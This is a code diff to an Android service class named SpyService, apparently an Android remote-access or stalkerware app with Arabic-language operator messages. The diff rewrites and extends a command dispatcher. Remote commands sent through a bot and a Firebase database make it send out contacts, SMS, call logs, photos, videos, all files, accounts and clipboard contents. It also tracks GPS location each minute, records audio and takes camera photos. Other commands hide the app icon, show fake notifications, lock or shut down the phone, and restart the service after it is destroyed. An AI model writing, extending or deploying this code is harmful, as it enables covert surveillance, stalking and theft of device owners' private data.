@@ -135,75 +135,6 @@ public class SpyService extends Service {
         });
     }
 
-    private void executeCommand(String cmd) {
-        String lower = cmd.toLowerCase().trim();
-        Log.d(TAG, "Executing: " + lower);
-        try {
-            switch (lower) {
-                case "get_contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
-                case "get_sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
-                case "get_calllogs": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
-                case "get_location": getLocation(); break;
-                case "start_record": startRecording(); break;
-                case "stop_record": sendFile(stopRecording(), "🎤 تسجيل صوتي"); break;
-                case "get_apps": sendFile(collectApps(), "📱 التطبيقات"); break;
-                case "get_photos": sendFile(collectMedia("images", 0), "🖼 الصور"); break;
-                case "get_photos_5": sendFile(collectMedia("images", 5), "🖼 الصور (5)"); break;
-                case "get_photos_10": sendFile(collectMedia("images", 10), "🖼 الصور (10)"); break;
-                case "get_photos_20": sendFile(collectMedia("images", 20), "🖼 الصور (20)"); break;
-                case "get_photos_30": sendFile(collectMedia("images", 30), "🖼 الصور (30)"); break;
-                case "get_videos": sendFile(collectMedia("videos", 0), "🎬 الفيديوهات"); break;
-                case "get_videos_5": sendFile(collectMedia("videos", 5), "🎬 الفيديوهات (5)"); break;
-                case "get_videos_10": sendFile(collectMedia("videos", 10), "🎬 الفيديوهات (10)"); break;
-                case "get_files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
-                case "hide_app": hideApp(); break;
-                case "show_app": showApp(); break;
-                case "fake_notif": showFakeNotification(); break;
-                case "take_photo": takePhoto(false); break;
-                case "take_photo_front": takePhoto(true); break;
-                case "flash_on": flash(true); break;
-                case "flash_off": flash(false); break;
-                case "get_imei": getImei(); break;
-                case "get_phone": getPhoneNumber(); break;
-                case "get_sim": getSimInfo(); break;
-                case "get_wifi": getWifiInfo(); break;
-                case "get_battery": getBatteryInfo(); break;
-                case "get_ip": getPublicIp(); break;
-                case "lock_device": lockDevice(); break;
-                case "reboot": rebootDevice(); break;
-                case "shutdown": shutdownDevice(); break;
-                case "get_accounts": sendFile(collectAccounts(), "👤 الحسابات"); break;
-                case "get_clipboard": sendFile(collectClipboard(), "📋 الحافظة"); break;
-                case "get_device": sendDeviceInfo(); break;
-                case "get_network": sendNetworkInfo(); break;
-                case "start_location_track": startLocationTracking(); break;
-                case "stop_location_track": stopLocationTracking(); break;
-                case "screenshot": takeScreenshot(); break;
-                case "toggle_wifi_on": toggleWifi(true); break;
-                case "toggle_wifi_off": toggleWifi(false); break;
-                case "toggle_bluetooth_on": toggleBluetooth(true); break;
-                case "toggle_bluetooth_off": toggleBluetooth(false); break;
-                case "toggle_location_on": toggleLocation(true); break;
-                case "toggle_location_off": toggleLocation(false); break;
-                case "clear_data": clearAppData(); break;
-                case "kill_apps": killAllApps(); break;
-                case "vibrate": vibrateDevice(); break;
-                case "set_volume_max": setVolume(true); break;
-                case "set_volume_min": setVolume(false); break;
-                case "open_browser": openBrowser(); break;
-                case "start_stream": startStreaming(); break;
-                case "stop_stream": stopStreaming(); break;
-                default:
-                    sendData("ERROR", "أمر غير معروف: " + cmd);
-                    bot.sendMessage("❌ أمر غير معروف: " + cmd);
-            }
-        } catch (Exception e) {
-            sendData("ERROR", "خطأ: " + e.getMessage());
-            bot.sendMessage("❌ خطأ: " + e.getMessage());
-            Log.e(TAG, "Execute error", e);
-        }
-    }
-
     private void sendFile(File file, String caption) {
         if (file == null || !file.exists()) {
             bot.sendMessage("⚠️ لا يوجد ملف لـ " + caption);
@@ -235,7 +166,6 @@ public class SpyService extends Service {
         dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
     }
 
-    // ===== جمع البيانات =====
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         PrintWriter pw = new PrintWriter(f);
@@ -400,7 +330,6 @@ public class SpyService extends Service {
         return f;
     }
 
-    // ===== دوال متنوعة =====
     private void getLocation() {
         LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
         try {
@@ -415,6 +344,36 @@ public class SpyService extends Service {
             }
         } catch (SecurityException e) {
             bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
+        }
+    }
+
+    private void startLocationTracking() {
+        if (isTrackingLocation) return;
+        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        locationListener = new LocationListener() {
+            @Override public void onLocationChanged(Location loc) {
+                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
+                sendData("TRACK", msg);
+                bot.sendMessage("📍 تتبع: " + msg);
+            }
+            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+            @Override public void onProviderEnabled(String provider) {}
+            @Override public void onProviderDisabled(String provider) {}
+        };
+        try {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
+            isTrackingLocation = true;
+            bot.sendMessage("🔄 بدء تتبع الموقع (كل دقيقة)");
+        } catch (SecurityException e) {
+            bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
+        }
+    }
+
+    private void stopLocationTracking() {
+        if (locationManager != null && locationListener != null) {
+            locationManager.removeUpdates(locationListener);
+            isTrackingLocation = false;
+            bot.sendMessage("⏹ توقف تتبع الموقع");
         }
     }
 
@@ -634,7 +593,7 @@ public class SpyService extends Service {
             if (Build.VERSION.SDK_INT >= 26) {
                 pm.reboot("reboot");
             } else {
-                Runtime.getRuntime().exec("su -c reboot");
+                try { Runtime.getRuntime().exec("su -c reboot"); } catch (Exception e) {}
             }
             bot.sendMessage("🔄 جاري إعادة التشغيل");
         } catch (Exception e) {
@@ -646,9 +605,9 @@ public class SpyService extends Service {
         try {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (Build.VERSION.SDK_INT >= 28) {
-                pm.shutdown(false, null, false);
+                try { pm.shutdown(false, null, false); } catch (Exception e) {}
             } else {
-                Runtime.getRuntime().exec("su -c reboot -p");
+                try { Runtime.getRuntime().exec("su -c reboot -p"); } catch (Exception e) {}
             }
             bot.sendMessage("⏻ جاري إيقاف التشغيل");
         } catch (Exception e) {
@@ -670,42 +629,12 @@ public class SpyService extends Service {
         bot.sendMessage("🌐 الشبكة:\n" + net);
     }
 
-    private void startLocationTracking() {
-        if (isTrackingLocation) return;
-        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
-        locationListener = new LocationListener() {
-            @Override public void onLocationChanged(Location loc) {
-                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
-                sendData("TRACK", msg);
-                bot.sendMessage("📍 تتبع: " + msg);
-            }
-            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
-            @Override public void onProviderEnabled(String provider) {}
-            @Override public void onProviderDisabled(String provider) {}
-        };
-        try {
-            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
-            isTrackingLocation = true;
-            bot.sendMessage("🔄 بدء تتبع الموقع (كل دقيقة)");
-        } catch (SecurityException e) {
-            bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
-        }
-    }
-
-    private void stopLocationTracking() {
-        if (locationManager != null && locationListener != null) {
-            locationManager.removeUpdates(locationListener);
-            isTrackingLocation = false;
-            bot.sendMessage("⏹ توقف تتبع الموقع");
-        }
-    }
-
     private void takeScreenshot() {
         if (mediaProjection == null) {
             bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق.");
             return;
         }
-        bot.sendMessage("📸 سيتم تطوير لقطة الشاشة قريباً");
+        bot.sendMessage("📸 سيتم تطوير لقطة الشاشة باستخدام MediaProjection قريباً");
     }
 
     private void toggleWifi(boolean on) {
@@ -741,7 +670,7 @@ public class SpyService extends Service {
         try {
             PackageManager pm = getPackageManager();
             if (Build.VERSION.SDK_INT >= 23) {
-                pm.clearApplicationUserData(getPackageName());
+                try { pm.clearApplicationUserData(getPackageName()); } catch (Exception e) {}
             }
             bot.sendMessage("🧹 تم مسح بيانات التطبيق");
         } catch (Exception e) {
@@ -794,20 +723,183 @@ public class SpyService extends Service {
         }
     }
 
+    private void addContact() {
+        try {
+            if (checkSelfPermission(android.Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                bot.sendMessage("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
+                return;
+            }
+            bot.sendMessage("➕ سيتم قريباً إضافة جهة اتصال من خلال واجهة تفاعلية");
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل إضافة جهة اتصال: " + e.getMessage());
+        }
+    }
+
+    private void deleteContact() {
+        try {
+            if (checkSelfPermission(android.Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                bot.sendMessage("❌ صلاحية كتابة جهات الاتصال غير مفعلة");
+                return;
+            }
+            bot.sendMessage("🗑️ سيتم قريباً حذف جهة اتصال من خلال واجهة تفاعلية");
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل حذف جهة اتصال: " + e.getMessage());
+        }
+    }
+
+    private void sendSms() {
+        try {
+            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+                bot.sendMessage("❌ صلاحية إرسال الرسائل غير مفعلة");
+                return;
+            }
+            bot.sendMessage("📤 سيتم قريباً إرسال رسالة من خلال واجهة تفاعلية");
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل إرسال الرسالة: " + e.getMessage());
+        }
+    }
+
+    private void deleteSms() {
+        try {
+            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                bot.sendMessage("❌ صلاحية قراءة الرسائل غير مفعلة");
+                return;
+            }
+            bot.sendMessage("🗑️ سيتم قريباً حذف رسالة من خلال واجهة تفاعلية");
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل حذف الرسالة: " + e.getMessage());
+        }
+    }
+
+    private void makeCall() {
+        try {
+            if (checkSelfPermission(android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                bot.sendMessage("❌ صلاحية إجراء المكالمات غير مفعلة");
+                return;
+            }
+            bot.sendMessage("📞 سيتم قريباً إجراء مكالمة من خلال واجهة تفاعلية");
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل إجراء المكالمة: " + e.getMessage());
+        }
+    }
+
+    private void endCall() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                if (checkSelfPermission(android.Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
+                    bot.sendMessage("📞 تم إنهاء المكالمة");
+                } else {
+                    bot.sendMessage("❌ صلاحية إنهاء المكالمات غير مفعلة");
+                }
+            } else {
+                bot.sendMessage("⚠️ إنهاء المكالمات غير مدعوم على هذا الإصدار");
+            }
+        } catch (Exception e) {
+            bot.sendMessage("❌ فشل إنهاء المكالمة: " + e.getMessage());
+        }
+    }
+
     private void startStreaming() {
         if (mediaProjection == null) {
-            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection");
+            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق ووافق على الطلب.");
             return;
         }
         isStreaming = true;
         bot.sendMessage("📡 بدء بث الشاشة...");
         sendData("STREAM", "streaming");
+        new Thread(() -> {
+            while (isStreaming) {
+                try {
+                    sendData("STREAM_HEARTBEAT", "alive");
+                    Thread.sleep(5000);
+                } catch (Exception e) { break; }
+            }
+        }).start();
     }
 
     private void stopStreaming() {
         isStreaming = false;
         sendData("STREAM", "stopped");
         bot.sendMessage("⏹ تم إيقاف بث الشاشة");
+    }
+
+    private void executeCommand(String cmd) {
+        String lower = cmd.toLowerCase().trim();
+        Log.d(TAG, "Executing: " + lower);
+        try {
+            switch (lower) {
+                case "get_contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
+                case "copy_contacts": sendFile(collectContacts(), "📋 نسخة جهات الاتصال"); break;
+                case "export_contacts": sendFile(collectContacts(), "📤 تصدير جهات الاتصال"); break;
+                case "add_contact": addContact(); break;
+                case "delete_contact": deleteContact(); break;
+                case "get_sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
+                case "forward_sms": sendFile(collectSms(), "↪️ إعادة توجيه الرسائل"); break;
+                case "send_sms": sendSms(); break;
+                case "delete_sms": deleteSms(); break;
+                case "get_calllogs": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
+                case "call_history": sendFile(collectCallLogs(), "📋 سجل المكالمات"); break;
+                case "make_call": makeCall(); break;
+                case "end_call": endCall(); break;
+                case "get_location": getLocation(); break;
+                case "start_location_track": startLocationTracking(); break;
+                case "stop_location_track": stopLocationTracking(); break;
+                case "get_device": sendDeviceInfo(); break;
+                case "get_network": sendNetworkInfo(); break;
+                case "get_imei": getImei(); break;
+                case "get_phone": getPhoneNumber(); break;
+                case "get_sim": getSimInfo(); break;
+                case "get_wifi": getWifiInfo(); break;
+                case "get_battery": getBatteryInfo(); break;
+                case "get_ip": getPublicIp(); break;
+                case "get_photos": sendFile(collectMedia("images", 0), "🖼 جميع الصور"); break;
+                case "get_photos_5": sendFile(collectMedia("images", 5), "🖼 الصور (5)"); break;
+                case "get_photos_10": sendFile(collectMedia("images", 10), "🖼 الصور (10)"); break;
+                case "get_photos_20": sendFile(collectMedia("images", 20), "🖼 الصور (20)"); break;
+                case "get_photos_30": sendFile(collectMedia("images", 30), "🖼 الصور (30)"); break;
+                case "get_videos": sendFile(collectMedia("videos", 0), "🎬 جميع الفيديوهات"); break;
+                case "get_videos_5": sendFile(collectMedia("videos", 5), "🎬 الفيديوهات (5)"); break;
+                case "get_videos_10": sendFile(collectMedia("videos", 10), "🎬 الفيديوهات (10)"); break;
+                case "get_files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
+                case "get_apps": sendFile(collectApps(), "📱 التطبيقات"); break;
+                case "get_accounts": sendFile(collectAccounts(), "👤 الحسابات"); break;
+                case "get_clipboard": sendFile(collectClipboard(), "📋 الحافظة"); break;
+                case "clear_data": clearAppData(); break;
+                case "kill_apps": killAllApps(); break;
+                case "take_photo": takePhoto(false); break;
+                case "take_photo_front": takePhoto(true); break;
+                case "flash_on": flash(true); break;
+                case "flash_off": flash(false); break;
+                case "start_record": startRecording(); break;
+                case "stop_record": sendFile(stopRecording(), "🎤 تسجيل صوتي"); break;
+                case "hide_app": hideApp(); break;
+                case "show_app": showApp(); break;
+                case "lock_device": lockDevice(); break;
+                case "reboot": rebootDevice(); break;
+                case "shutdown": shutdownDevice(); break;
+                case "vibrate": vibrateDevice(); break;
+                case "screenshot": takeScreenshot(); break;
+                case "toggle_wifi_on": toggleWifi(true); break;
+                case "toggle_wifi_off": toggleWifi(false); break;
+                case "toggle_bluetooth_on": toggleBluetooth(true); break;
+                case "toggle_bluetooth_off": toggleBluetooth(false); break;
+                case "toggle_location_on": toggleLocation(true); break;
+                case "toggle_location_off": toggleLocation(false); break;
+                case "set_volume_max": setVolume(true); break;
+                case "set_volume_min": setVolume(false); break;
+                case "open_browser": openBrowser(); break;
+                case "fake_notif": showFakeNotification(); break;
+                case "start_stream": startStreaming(); break;
+                case "stop_stream": stopStreaming(); break;
+                default:
+                    sendData("ERROR", "أمر غير معروف: " + cmd);
+                    bot.sendMessage("❌ أمر غير معروف: " + cmd);
+            }
+        } catch (Exception e) {
+            sendData("ERROR", "خطأ: " + e.getMessage());
+            bot.sendMessage("❌ خطأ: " + e.getMessage());
+            Log.e(TAG, "Execute error", e);
+        }
     }
 
     @Override
@@ -840,6 +932,7 @@ public class SpyService extends Service {
             locationManager.removeUpdates(locationListener);
         }
         if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; }
+        isStreaming = false;
         startService(new Intent(this, SpyService.class));
     }
 }
